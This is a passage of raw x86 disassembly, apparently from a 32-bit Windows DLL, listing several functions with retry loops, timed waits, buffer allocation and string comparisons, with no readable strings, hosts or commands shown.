1000c3a7:	89 55 fc             	mov    %edx,-0x4(%ebp)
1000c3aa:	e8 a1 f5 ff ff       	call   0x1000b950
1000c3af:	85 c0                	test   %eax,%eax
1000c3b1:	75 47                	jne    0x1000c3fa
1000c3b3:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000c3b6:	50                   	push   %eax
1000c3b7:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000c3ba:	50                   	push   %eax
1000c3bb:	bf 34 f4 00 10       	mov    $0x1000f434,%edi
1000c3c0:	57                   	push   %edi
1000c3c1:	89 55 f8             	mov    %edx,-0x8(%ebp)
1000c3c4:	89 55 f4             	mov    %edx,-0xc(%ebp)
1000c3c7:	e8 5b 04 00 00       	call   0x1000c827
1000c3cc:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000c3cf:	85 c0                	test   %eax,%eax
1000c3d1:	74 16                	je     0x1000c3e9
1000c3d3:	ff 75 f8             	pushl  -0x8(%ebp)
1000c3d6:	8b 7d f4             	mov    -0xc(%ebp),%edi
1000c3d9:	e8 b6 f5 ff ff       	call   0x1000b994
1000c3de:	ff 75 f8             	pushl  -0x8(%ebp)
1000c3e1:	e8 2d a6 ff ff       	call   0x10006a13
1000c3e6:	59                   	pop    %ecx
1000c3e7:	eb 11                	jmp    0x1000c3fa
1000c3e9:	68 a0 f2 00 10       	push   $0x1000f2a0
1000c3ee:	57                   	push   %edi
1000c3ef:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c3f5:	e8 de 74 ff ff       	call   0x100038d8
1000c3fa:	8b ce                	mov    %esi,%ecx
1000c3fc:	33 ff                	xor    %edi,%edi
1000c3fe:	e8 4d f5 ff ff       	call   0x1000b950
1000c403:	85 c0                	test   %eax,%eax
1000c405:	74 34                	je     0x1000c43b
1000c407:	e8 4d f5 ff ff       	call   0x1000b959
1000c40c:	85 c0                	test   %eax,%eax
1000c40e:	75 24                	jne    0x1000c434
1000c410:	e8 84 f8 ff ff       	call   0x1000bc99
1000c415:	b8 f0 ff 00 00       	mov    $0xfff0,%eax
1000c41a:	6a 01                	push   $0x1
1000c41c:	66 89 46 10          	mov    %ax,0x10(%esi)
1000c420:	ff b3 b4 03 00 00    	pushl  0x3b4(%ebx)
1000c426:	8b fe                	mov    %esi,%edi
1000c428:	e8 b2 f5 ff ff       	call   0x1000b9df
1000c42d:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000c430:	8b f8                	mov    %eax,%edi
1000c432:	eb 07                	jmp    0x1000c43b
1000c434:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
1000c43b:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
1000c43f:	74 3a                	je     0x1000c47b
1000c441:	85 ff                	test   %edi,%edi
1000c443:	74 36                	je     0x1000c47b
1000c445:	0f b7 46 10          	movzwl 0x10(%esi),%eax
1000c449:	50                   	push   %eax
1000c44a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000c44d:	68 d4 e6 00 10       	push   $0x1000e6d4
1000c452:	50                   	push   %eax
1000c453:	ff 15 b4 e1 00 10    	call   *0x1000e1b4
1000c459:	83 c4 0c             	add    $0xc,%esp
1000c45c:	8d 45 e4             	lea    -0x1c(%ebp),%eax
1000c45f:	50                   	push   %eax
1000c460:	68 34 f4 00 10       	push   $0x1000f434
1000c465:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c46b:	e8 68 74 ff ff       	call   0x100038d8
1000c470:	8b b3 9c 03 00 00    	mov    0x39c(%ebx),%esi
1000c476:	e8 1a 71 ff ff       	call   0x10003595
1000c47b:	8b 45 fc             	mov    -0x4(%ebp),%eax
1000c47e:	5f                   	pop    %edi
1000c47f:	5e                   	pop    %esi
1000c480:	5b                   	pop    %ebx
1000c481:	c9                   	leave  
1000c482:	c3                   	ret    
1000c483:	55                   	push   %ebp
1000c484:	8b ec                	mov    %esp,%ebp
1000c486:	83 ec 18             	sub    $0x18,%esp
1000c489:	33 c0                	xor    %eax,%eax
1000c48b:	53                   	push   %ebx
1000c48c:	8b 1d 40 e1 00 10    	mov    0x1000e140,%ebx
1000c492:	57                   	push   %edi
1000c493:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000c496:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000c499:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c49c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
1000c4a0:	0f 85 a7 00 00 00    	jne    0x1000c54d
1000c4a6:	83 be 04 04 00 00 00 	cmpl   $0x0,0x404(%esi)
1000c4ad:	74 12                	je     0x1000c4c1
1000c4af:	ff d3                	call   *%ebx
1000c4b1:	8b 8e 04 04 00 00    	mov    0x404(%esi),%ecx
1000c4b7:	81 c1 80 cb a4 00    	add    $0xa4cb80,%ecx
1000c4bd:	3b c1                	cmp    %ecx,%eax
1000c4bf:	76 71                	jbe    0x1000c532
1000c4c1:	68 b8 0b 00 00       	push   $0xbb8
1000c4c6:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
1000c4cd:	ff 15 44 e1 00 10    	call   *0x1000e144
1000c4d3:	8b be 9c 03 00 00    	mov    0x39c(%esi),%edi
1000c4d9:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000c4dd:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
1000c4e1:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000c4e4:	50                   	push   %eax
1000c4e5:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000c4e8:	50                   	push   %eax
1000c4e9:	e8 5c 6c ff ff       	call   0x1000314a
1000c4ee:	85 c0                	test   %eax,%eax
1000c4f0:	74 2d                	je     0x1000c51f
1000c4f2:	ff 75 fc             	pushl  -0x4(%ebp)
1000c4f5:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000c4f8:	8b be a0 03 00 00    	mov    0x3a0(%esi),%edi
1000c4fe:	e8 57 53 ff ff       	call   0x1000185a
1000c503:	85 c0                	test   %eax,%eax
1000c505:	74 0f                	je     0x1000c516
1000c507:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
1000c50e:	ff d3                	call   *%ebx
1000c510:	89 86 04 04 00 00    	mov    %eax,0x404(%esi)
1000c516:	ff 75 fc             	pushl  -0x4(%ebp)
1000c519:	e8 f5 a4 ff ff       	call   0x10006a13
1000c51e:	59                   	pop    %ecx
1000c51f:	ff 45 f8             	incl   -0x8(%ebp)
1000c522:	83 7d f8 05          	cmpl   $0x5,-0x8(%ebp)
1000c526:	0f 8c 70 ff ff ff    	jl     0x1000c49c
1000c52c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
1000c530:	75 1b                	jne    0x1000c54d
1000c532:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
1000c536:	74 15                	je     0x1000c54d
1000c538:	68 3c f4 00 10       	push   $0x1000f43c
1000c53d:	68 50 f4 00 10       	push   $0x1000f450
1000c542:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000c548:	e8 8b 73 ff ff       	call   0x100038d8
1000c54d:	33 ff                	xor    %edi,%edi
1000c54f:	39 be 04 04 00 00    	cmp    %edi,0x404(%esi)
1000c555:	74 26                	je     0x1000c57d
1000c557:	8b 8e a0 03 00 00    	mov    0x3a0(%esi),%ecx
1000c55d:	e8 ea 52 ff ff       	call   0x1000184c
1000c562:	8b f8                	mov    %eax,%edi
1000c564:	85 ff                	test   %edi,%edi
1000c566:	75 15                	jne    0x1000c57d
1000c568:	68 5c f4 00 10       	push   $0x1000f45c
1000c56d:	68 50 f4 00 10       	push   $0x1000f450
1000c572:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000c578:	e8 5b 73 ff ff       	call   0x100038d8
1000c57d:	8b c7                	mov    %edi,%eax
1000c57f:	5f                   	pop    %edi
1000c580:	5b                   	pop    %ebx
1000c581:	c9                   	leave  
1000c582:	c3                   	ret    
1000c583:	55                   	push   %ebp
1000c584:	8b ec                	mov    %esp,%ebp
1000c586:	83 ec 28             	sub    $0x28,%esp
1000c589:	56                   	push   %esi
1000c58a:	8b 75 14             	mov    0x14(%ebp),%esi
1000c58d:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000c590:	50                   	push   %eax
1000c591:	ff 75 10             	pushl  0x10(%ebp)
1000c594:	8b 86 9c 03 00 00    	mov    0x39c(%esi),%eax
1000c59a:	ff 75 0c             	pushl  0xc(%ebp)
1000c59d:	e8 6f 78 ff ff       	call   0x10003e11
1000c5a2:	85 c0                	test   %eax,%eax
1000c5a4:	75 05                	jne    0x1000c5ab
1000c5a6:	6a 0d                	push   $0xd
1000c5a8:	58                   	pop    %eax
1000c5a9:	eb 31                	jmp    0x1000c5dc
1000c5ab:	e8 d3 fe ff ff       	call   0x1000c483
1000c5b0:	85 c0                	test   %eax,%eax
1000c5b2:	8d 45 dc             	lea    -0x24(%ebp),%eax
1000c5b5:	75 07                	jne    0x1000c5be
1000c5b7:	68 68 f4 00 10       	push   $0x1000f468
1000c5bc:	eb 05                	jmp    0x1000c5c3
1000c5be:	68 6c f4 00 10       	push   $0x1000f46c
1000c5c3:	6a 3a                	push   $0x3a
1000c5c5:	50                   	push   %eax
1000c5c6:	ff b6 9c 03 00 00    	pushl  0x39c(%esi)
1000c5cc:	e8 35 75 ff ff       	call   0x10003b06
1000c5d1:	8b 45 18             	mov    0x18(%ebp),%eax
1000c5d4:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000c5da:	33 c0                	xor    %eax,%eax
1000c5dc:	5e                   	pop    %esi
1000c5dd:	c9                   	leave  
1000c5de:	c2 14 00             	ret    $0x14
1000c5e1:	55                   	push   %ebp
1000c5e2:	8b ec                	mov    %esp,%ebp
1000c5e4:	57                   	push   %edi
1000c5e5:	ff 75 0c             	pushl  0xc(%ebp)
1000c5e8:	33 ff                	xor    %edi,%edi
1000c5ea:	e8 f5 a3 ff ff       	call   0x100069e4
1000c5ef:	59                   	pop    %ecx
1000c5f0:	89 06                	mov    %eax,(%esi)
1000c5f2:	3b c7                	cmp    %edi,%eax
1000c5f4:	74 25                	je     0x1000c61b
1000c5f6:	53                   	push   %ebx
1000c5f7:	ff 75 0c             	pushl  0xc(%ebp)
1000c5fa:	8b d8                	mov    %eax,%ebx
1000c5fc:	8b 45 08             	mov    0x8(%ebp),%eax
1000c5ff:	6a 01                	push   $0x1
1000c601:	e8 34 8f ff ff       	call   0x1000553a
1000c606:	59                   	pop    %ecx
1000c607:	59                   	pop    %ecx
1000c608:	5b                   	pop    %ebx
1000c609:	83 f8 03             	cmp    $0x3,%eax
1000c60c:	76 03                	jbe    0x1000c611
1000c60e:	47                   	inc    %edi
1000c60f:	eb 0a                	jmp    0x1000c61b
1000c611:	ff 36                	pushl  (%esi)
1000c613:	e8 fb a3 ff ff       	call   0x10006a13
1000c618:	59                   	pop    %ecx
1000c619:	89 3e                	mov    %edi,(%esi)
1000c61b:	8b c7                	mov    %edi,%eax
1000c61d:	5f                   	pop    %edi
1000c61e:	5d                   	pop    %ebp
1000c61f:	c3                   	ret    
1000c620:	55                   	push   %ebp
1000c621:	8b ec                	mov    %esp,%ebp
1000c623:	b8 00 00 40 00       	mov    $0x400000,%eax
1000c628:	53                   	push   %ebx
1000c629:	50                   	push   %eax
1000c62a:	89 06                	mov    %eax,(%esi)
1000c62c:	e8 b3 a3 ff ff       	call   0x100069e4
1000c631:	59                   	pop    %ecx
1000c632:	89 07                	mov    %eax,(%edi)
1000c634:	85 c0                	test   %eax,%eax
1000c636:	74 27                	je     0x1000c65f
1000c638:	ff 36                	pushl  (%esi)
1000c63a:	33 db                	xor    %ebx,%ebx
1000c63c:	50                   	push   %eax
1000c63d:	ff 75 08             	pushl  0x8(%ebp)
1000c640:	e8 5f 9f ff ff       	call   0x100065a4
1000c645:	83 c4 0c             	add    $0xc,%esp
1000c648:	89 06                	mov    %eax,(%esi)
1000c64a:	85 c0                	test   %eax,%eax
1000c64c:	75 0c                	jne    0x1000c65a
1000c64e:	ff 37                	pushl  (%edi)
1000c650:	e8 be a3 ff ff       	call   0x10006a13
1000c655:	21 1f                	and    %ebx,(%edi)
1000c657:	59                   	pop    %ecx
1000c658:	eb 03                	jmp    0x1000c65d
1000c65a:	33 db                	xor    %ebx,%ebx
1000c65c:	43                   	inc    %ebx
1000c65d:	8b c3                	mov    %ebx,%eax
1000c65f:	5b                   	pop    %ebx
1000c660:	5d                   	pop    %ebp
1000c661:	c3                   	ret    
1000c662:	55                   	push   %ebp
1000c663:	8b ec                	mov    %esp,%ebp
1000c665:	83 e4 f8             	and    $0xfffffff8,%esp
1000c668:	81 ec b0 05 00 00    	sub    $0x5b0,%esp
1000c66e:	8b 0e                	mov    (%esi),%ecx
1000c670:	83 64 24 04 00       	andl   $0x0,0x4(%esp)
1000c675:	53                   	push   %ebx
1000c676:	57                   	push   %edi
1000c677:	3b c8                	cmp    %eax,%ecx
1000c679:	73 7e                	jae    0x1000c6f9
1000c67b:	2b c1                	sub    %ecx,%eax
1000c67d:	f6 46 04 01          	testb  $0x1,0x4(%esi)
1000c681:	8d 14 31             	lea    (%ecx,%esi,1),%edx
1000c684:	89 54 24 10          	mov    %edx,0x10(%esp)
1000c688:	89 44 24 14          	mov    %eax,0x14(%esp)
1000c68c:	75 6b                	jne    0x1000c6f9
1000c68e:	8b 3d e0 e0 00 10    	mov    0x1000e0e0,%edi
1000c694:	8d 44 24 18          	lea    0x18(%esp),%eax
1000c698:	50                   	push   %eax
1000c699:	bb 68 01 00 00       	mov    $0x168,%ebx
1000c69e:	53                   	push   %ebx
1000c69f:	ff d7                	call   *%edi
1000c6a1:	8d 84 24 e8 02 00 00 	lea    0x2e8(%esp),%eax
1000c6a8:	50                   	push   %eax
1000c6a9:	53                   	push   %ebx
1000c6aa:	ff d7                	call   *%edi
1000c6ac:	8d 44 24 18          	lea    0x18(%esp),%eax
1000c6b0:	50                   	push   %eax
1000c6b1:	33 ff                	xor    %edi,%edi
1000c6b3:	57                   	push   %edi
1000c6b4:	68 44 f2 00 10       	push   $0x1000f244
1000c6b9:	50                   	push   %eax
1000c6ba:	ff 15 d8 e0 00 10    	call   *0x1000e0d8
1000c6c0:	ff 74 24 14          	pushl  0x14(%esp)
1000c6c4:	8d 44 24 1c          	lea    0x1c(%esp),%eax
1000c6c8:	ff 74 24 14          	pushl  0x14(%esp)
1000c6cc:	50                   	push   %eax
1000c6cd:	e8 7c 8f ff ff       	call   0x1000564e
1000c6d2:	83 c4 0c             	add    $0xc,%esp
1000c6d5:	85 c0                	test   %eax,%eax
1000c6d7:	74 20                	je     0x1000c6f9
1000c6d9:	f6 46 04 02          	testb  $0x2,0x4(%esi)
1000c6dd:	57                   	push   %edi
1000c6de:	8d 44 24 1c          	lea    0x1c(%esp),%eax
1000c6e2:	57                   	push   %edi
1000c6e3:	50                   	push   %eax
1000c6e4:	74 07                	je     0x1000c6ed
1000c6e6:	e8 09 92 ff ff       	call   0x100058f4
1000c6eb:	eb 05                	jmp    0x1000c6f2
1000c6ed:	e8 da 91 ff ff       	call   0x100058cc
1000c6f2:	89 44 24 18          	mov    %eax,0x18(%esp)
1000c6f6:	83 c4 0c             	add    $0xc,%esp
1000c6f9:	8b 44 24 0c          	mov    0xc(%esp),%eax
1000c6fd:	5f                   	pop    %edi
1000c6fe:	5b                   	pop    %ebx
1000c6ff:	8b e5                	mov    %ebp,%esp
1000c701:	5d                   	pop    %ebp
1000c702:	c3                   	ret    
1000c703:	55                   	push   %ebp
1000c704:	8b ec                	mov    %esp,%ebp
1000c706:	83 ec 38             	sub    $0x38,%esp
1000c709:	53                   	push   %ebx
1000c70a:	8b 5d 14             	mov    0x14(%ebp),%ebx
1000c70d:	56                   	push   %esi
1000c70e:	57                   	push   %edi
1000c70f:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000c712:	50                   	push   %eax
1000c713:	ff 75 10             	pushl  0x10(%ebp)
1000c716:	8b 83 9c 03 00 00    	mov    0x39c(%ebx),%eax
1000c71c:	ff 75 0c             	pushl  0xc(%ebp)
1000c71f:	e8 ed 76 ff ff       	call   0x10003e11
1000c724:	85 c0                	test   %eax,%eax
1000c726:	0f 84 e9 00 00 00    	je     0x1000c815
1000c72c:	ff 75 10             	pushl  0x10(%ebp)
1000c72f:	33 ff                	xor    %edi,%edi
1000c731:	ff 75 0c             	pushl  0xc(%ebp)
1000c734:	8d 75 14             	lea    0x14(%ebp),%esi
1000c737:	89 7d 14             	mov    %edi,0x14(%ebp)
1000c73a:	e8 a2 fe ff ff       	call   0x1000c5e1
1000c73f:	59                   	pop    %ecx
1000c740:	59                   	pop    %ecx
1000c741:	85 c0                	test   %eax,%eax
1000c743:	0f 84 cc 00 00 00    	je     0x1000c815
1000c749:	ff 75 14             	pushl  0x14(%ebp)
1000c74c:	66 89 7d ec          	mov    %di,-0x14(%ebp)
1000c750:	89 7d 10             	mov    %edi,0x10(%ebp)
1000c753:	89 7d 0c             	mov    %edi,0xc(%ebp)
1000c756:	8d 75 0c             	lea    0xc(%ebp),%esi
1000c759:	8d 7d 10             	lea    0x10(%ebp),%edi
1000c75c:	c6 45 ee 00          	movb   $0x0,-0x12(%ebp)
1000c760:	e8 bb fe ff ff       	call   0x1000c620
1000c765:	59                   	pop    %ecx
1000c766:	85 c0                	test   %eax,%eax
1000c768:	0f 84 83 00 00 00    	je     0x1000c7f1
1000c76e:	8b 4d 0c             	mov    0xc(%ebp),%ecx
1000c771:	8b b3 98 03 00 00    	mov    0x398(%ebx),%esi
1000c777:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
1000c77b:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
1000c77f:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000c782:	50                   	push   %eax
1000c783:	ff 75 10             	pushl  0x10(%ebp)
1000c786:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000c789:	e8 06 b4 ff ff       	call   0x10007b94
1000c78e:	85 c0                	test   %eax,%eax
1000c790:	74 39                	je     0x1000c7cb
1000c792:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c795:	8b 75 f4             	mov    -0xc(%ebp),%esi
1000c798:	e8 c5 fe ff ff       	call   0x1000c662
1000c79d:	85 c0                	test   %eax,%eax
1000c79f:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000c7a2:	50                   	push   %eax
1000c7a3:	6a 29                	push   $0x29
1000c7a5:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000c7a8:	50                   	push   %eax
1000c7a9:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c7af:	75 08                	jne    0x1000c7b9
1000c7b1:	66 c7 45 ec 31 36    	movw   $0x3631,-0x14(%ebp)
1000c7b7:	eb 04                	jmp    0x1000c7bd
1000c7b9:	c6 45 ec 33          	movb   $0x33,-0x14(%ebp)
1000c7bd:	e8 44 73 ff ff       	call   0x10003b06
1000c7c2:	56                   	push   %esi
1000c7c3:	e8 4b a2 ff ff       	call   0x10006a13
1000c7c8:	59                   	pop    %ecx
1000c7c9:	eb 1b                	jmp    0x1000c7e6
1000c7cb:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000c7ce:	50                   	push   %eax
1000c7cf:	6a 29                	push   $0x29
1000c7d1:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000c7d4:	50                   	push   %eax
1000c7d5:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c7db:	66 c7 45 ec 31 37    	movw   $0x3731,-0x14(%ebp)
1000c7e1:	e8 20 73 ff ff       	call   0x10003b06
1000c7e6:	ff 75 10             	pushl  0x10(%ebp)
1000c7e9:	e8 25 a2 ff ff       	call   0x10006a13
1000c7ee:	59                   	pop    %ecx
1000c7ef:	eb 1b                	jmp    0x1000c80c
1000c7f1:	8d 45 ec             	lea    -0x14(%ebp),%eax
1000c7f4:	50                   	push   %eax
1000c7f5:	6a 29                	push   $0x29
1000c7f7:	8d 45 cc             	lea    -0x34(%ebp),%eax
1000c7fa:	50                   	push   %eax
1000c7fb:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c801:	66 c7 45 ec 31 38    	movw   $0x3831,-0x14(%ebp)
1000c807:	e8 fa 72 ff ff       	call   0x10003b06
1000c80c:	ff 75 14             	pushl  0x14(%ebp)
1000c80f:	e8 ff a1 ff ff       	call   0x10006a13
1000c814:	59                   	pop    %ecx
1000c815:	8b 45 18             	mov    0x18(%ebp),%eax
1000c818:	5f                   	pop    %edi
1000c819:	5e                   	pop    %esi
1000c81a:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
1000c820:	33 c0                	xor    %eax,%eax
1000c822:	5b                   	pop    %ebx
1000c823:	c9                   	leave  
1000c824:	c2 14 00             	ret    $0x14
1000c827:	55                   	push   %ebp
1000c828:	8b ec                	mov    %esp,%ebp
1000c82a:	83 ec 14             	sub    $0x14,%esp
1000c82d:	8b 45 08             	mov    0x8(%ebp),%eax
1000c830:	56                   	push   %esi
1000c831:	57                   	push   %edi
1000c832:	33 ff                	xor    %edi,%edi
1000c834:	89 7d fc             	mov    %edi,-0x4(%ebp)
1000c837:	89 7d f8             	mov    %edi,-0x8(%ebp)
1000c83a:	e8 4c be ff ff       	call   0x1000868b
1000c83f:	8b b3 94 03 00 00    	mov    0x394(%ebx),%esi
1000c845:	57                   	push   %edi
1000c846:	57                   	push   %edi
1000c847:	50                   	push   %eax
1000c848:	89 45 ec             	mov    %eax,-0x14(%ebp)
1000c84b:	e8 ca c3 ff ff       	call   0x10008c1a
1000c850:	8b f0                	mov    %eax,%esi
1000c852:	89 75 f4             	mov    %esi,-0xc(%ebp)
1000c855:	3b f7                	cmp    %edi,%esi
1000c857:	74 55                	je     0x1000c8ae
1000c859:	56                   	push   %esi
1000c85a:	e8 85 a1 ff ff       	call   0x100069e4
1000c85f:	59                   	pop    %ecx
1000c860:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000c863:	3b c7                	cmp    %edi,%eax
1000c865:	74 47                	je     0x1000c8ae
1000c867:	56                   	push   %esi
1000c868:	8b b3 94 03 00 00    	mov    0x394(%ebx),%esi
1000c86e:	50                   	push   %eax
1000c86f:	ff 75 ec             	pushl  -0x14(%ebp)
1000c872:	e8 a3 c3 ff ff       	call   0x10008c1a
1000c877:	8b c8                	mov    %eax,%ecx
1000c879:	89 4d f4             	mov    %ecx,-0xc(%ebp)
1000c87c:	3b cf                	cmp    %edi,%ecx
1000c87e:	74 25                	je     0x1000c8a5
1000c880:	ff 75 10             	pushl  0x10(%ebp)
1000c883:	8b 45 0c             	mov    0xc(%ebp),%eax
1000c886:	ff 75 fc             	pushl  -0x4(%ebp)
1000c889:	8b b3 98 03 00 00    	mov    0x398(%ebx),%esi
1000c88f:	e8 00 b3 ff ff       	call   0x10007b94
1000c894:	85 c0                	test   %eax,%eax
1000c896:	74 0d                	je     0x1000c8a5
1000c898:	8b 4d 10             	mov    0x10(%ebp),%ecx
1000c89b:	33 c0                	xor    %eax,%eax
1000c89d:	39 39                	cmp    %edi,(%ecx)
1000c89f:	0f 95 c0             	setne  %al
1000c8a2:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c8a5:	ff 75 fc             	pushl  -0x4(%ebp)
1000c8a8:	e8 66 a1 ff ff       	call   0x10006a13
1000c8ad:	59                   	pop    %ecx
1000c8ae:	89 7d f0             	mov    %edi,-0x10(%ebp)
1000c8b1:	39 7d f8             	cmp    %edi,-0x8(%ebp)
1000c8b4:	75 6c                	jne    0x1000c922
1000c8b6:	83 7d f0 03          	cmpl   $0x3,-0x10(%ebp)
1000c8ba:	7d 66                	jge    0x1000c922
1000c8bc:	8b bb 9c 03 00 00    	mov    0x39c(%ebx),%edi
1000c8c2:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000c8c5:	50                   	push   %eax
1000c8c6:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000c8c9:	50                   	push   %eax
1000c8ca:	ff 75 08             	pushl  0x8(%ebp)
1000c8cd:	e8 d3 75 ff ff       	call   0x10003ea5
1000c8d2:	85 c0                	test   %eax,%eax
1000c8d4:	74 43                	je     0x1000c919
1000c8d6:	8b 7d 10             	mov    0x10(%ebp),%edi
1000c8d9:	8b 45 0c             	mov    0xc(%ebp),%eax
1000c8dc:	8b 4d f4             	mov    -0xc(%ebp),%ecx
1000c8df:	8b b3 98 03 00 00    	mov    0x398(%ebx),%esi
1000c8e5:	57                   	push   %edi
1000c8e6:	ff 75 fc             	pushl  -0x4(%ebp)
1000c8e9:	e8 a6 b2 ff ff       	call   0x10007b94
1000c8ee:	85 c0                	test   %eax,%eax
1000c8f0:	74 1e                	je     0x1000c910
1000c8f2:	ff 75 f4             	pushl  -0xc(%ebp)
1000c8f5:	8b b3 94 03 00 00    	mov    0x394(%ebx),%esi
1000c8fb:	ff 75 fc             	pushl  -0x4(%ebp)
1000c8fe:	ff 75 ec             	pushl  -0x14(%ebp)
1000c901:	e8 3e c2 ff ff       	call   0x10008b44
1000c906:	33 c0                	xor    %eax,%eax
1000c908:	39 07                	cmp    %eax,(%edi)
1000c90a:	0f 95 c0             	setne  %al
1000c90d:	89 45 f8             	mov    %eax,-0x8(%ebp)
1000c910:	ff 75 fc             	pushl  -0x4(%ebp)
1000c913:	e8 fb a0 ff ff       	call   0x10006a13
1000c918:	59                   	pop    %ecx
1000c919:	ff 45 f0             	incl   -0x10(%ebp)
1000c91c:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
1000c920:	74 94                	je     0x1000c8b6
1000c922:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000c925:	5f                   	pop    %edi
1000c926:	5e                   	pop    %esi
1000c927:	c9                   	leave  
1000c928:	c2 0c 00             	ret    $0xc
1000c92b:	55                   	push   %ebp
1000c92c:	8b ec                	mov    %esp,%ebp
1000c92e:	53                   	push   %ebx
1000c92f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000c932:	56                   	push   %esi
1000c933:	57                   	push   %edi
1000c934:	85 db                	test   %ebx,%ebx
1000c936:	0f 84 af 00 00 00    	je     0x1000c9eb
1000c93c:	8b 35 30 e1 00 10    	mov    0x1000e130,%esi
1000c942:	68 70 f4 00 10       	push   $0x1000f470
1000c947:	ff 75 10             	pushl  0x10(%ebp)
1000c94a:	ff d6                	call   *%esi
1000c94c:	85 c0                	test   %eax,%eax
1000c94e:	75 3b                	jne    0x1000c98b
1000c950:	83 7d 18 04          	cmpl   $0x4,0x18(%ebp)
1000c954:	75 35                	jne    0x1000c98b
1000c956:	8b 45 14             	mov    0x14(%ebp),%eax
1000c959:	6a 04                	push   $0x4
1000c95b:	b9 80 f4 00 10       	mov    $0x1000f480,%ecx
1000c960:	e8 31 8c ff ff       	call   0x10005596
1000c965:	59                   	pop    %ecx
1000c966:	85 c0                	test   %eax,%eax
1000c968:	74 21                	je     0x1000c98b
1000c96a:	68 2a be 00 10       	push   $0x1000be2a
1000c96f:	53                   	push   %ebx
1000c970:	e8 ee f4 ff ff       	call   0x1000be63
1000c975:	68 3d be 00 10       	push   $0x1000be3d
1000c97a:	53                   	push   %ebx
1000c97b:	e8 e3 f4 ff ff       	call   0x1000be63
1000c980:	68 50 be 00 10       	push   $0x1000be50
1000c985:	53                   	push   %ebx
1000c986:	e8 d8 f4 ff ff       	call   0x1000be63
1000c98b:	68 88 f4 00 10       	push   $0x1000f488
1000c990:	ff 75 10             	pushl  0x10(%ebp)
1000c993:	ff d6                	call   *%esi
1000c995:	85 c0                	test   %eax,%eax
1000c997:	75 13                	jne    0x1000c9ac
1000c999:	ff 75 14             	pushl  0x14(%ebp)
1000c99c:	68 cc e4 00 10       	push   $0x1000e4cc
1000c9a1:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c9a7:	e8 2c 6f ff ff       	call   0x100038d8
1000c9ac:	68 94 f4 00 10       	push   $0x1000f494
1000c9b1:	ff 75 10             	pushl  0x10(%ebp)
1000c9b4:	ff d6                	call   *%esi
1000c9b6:	85 c0                	test   %eax,%eax
1000c9b8:	75 13                	jne    0x1000c9cd
1000c9ba:	ff 75 14             	pushl  0x14(%ebp)
1000c9bd:	68 a4 f4 00 10       	push   $0x1000f4a4
1000c9c2:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c9c8:	e8 0b 6f ff ff       	call   0x100038d8
1000c9cd:	bf b0 f4 00 10       	mov    $0x1000f4b0,%edi
1000c9d2:	57                   	push   %edi
1000c9d3:	ff 75 10             	pushl  0x10(%ebp)
1000c9d6:	ff d6                	call   *%esi
1000c9d8:	85 c0                	test   %eax,%eax
1000c9da:	75 0f                	jne    0x1000c9eb
1000c9dc:	ff 75 14             	pushl  0x14(%ebp)
1000c9df:	57                   	push   %edi
1000c9e0:	ff b3 9c 03 00 00    	pushl  0x39c(%ebx)
1000c9e6:	e8 ed 6e ff ff       	call   0x100038d8
1000c9eb:	5f                   	pop    %edi
1000c9ec:	5e                   	pop    %esi
1000c9ed:	5b                   	pop    %ebx
1000c9ee:	5d                   	pop    %ebp
1000c9ef:	c3                   	ret    
1000c9f0:	55                   	push   %ebp
1000c9f1:	8b ec                	mov    %esp,%ebp
1000c9f3:	8b 45 14             	mov    0x14(%ebp),%eax
1000c9f6:	56                   	push   %esi
1000c9f7:	57                   	push   %edi
1000c9f8:	8b 7d 0c             	mov    0xc(%ebp),%edi
1000c9fb:	6a 01                	push   $0x1
1000c9fd:	ff 75 10             	pushl  0x10(%ebp)
1000ca00:	68 b8 f4 00 10       	push   $0x1000f4b8
1000ca05:	ff b7 9c 03 00 00    	pushl  0x39c(%edi)
1000ca0b:	e8 27 72 ff ff       	call   0x10003c37
1000ca10:	85 c0                	test   %eax,%eax
